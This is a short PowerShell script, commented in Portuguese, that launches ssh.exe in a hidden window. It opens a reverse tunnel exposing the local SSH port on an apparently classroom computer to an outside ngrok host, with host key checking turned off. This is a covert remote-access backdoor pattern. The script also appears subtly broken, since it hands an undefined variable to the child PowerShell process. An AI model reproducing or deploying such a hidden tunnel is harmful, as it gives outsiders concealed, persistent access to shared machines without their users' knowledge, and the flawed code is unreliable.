# Caminho do SSH
$sshPath = "C:\Program Files\OpenSSH\ssh.exe"

# Caminho da chave privada
$keyPath = "C:\Users\SALA 1 ANO B\.ssh\ssh_key"

# Caminho do log
$logFile = "C:\Users\SALA 1 ANO B\.ssh\ssh_verbose_log.txt"

# Monta o comando exatamente como no terminal
$command = "& `"$sshPath`" -i `"$keyPath`" -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 u0_a434@0.tcp.sa.ngrok.io -p 17461 -N -vvv *> `"$logFile`""

# Executa invisível pelo PowerShell
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-NoProfile -Command `$command" `
    -WindowStyle Hidden
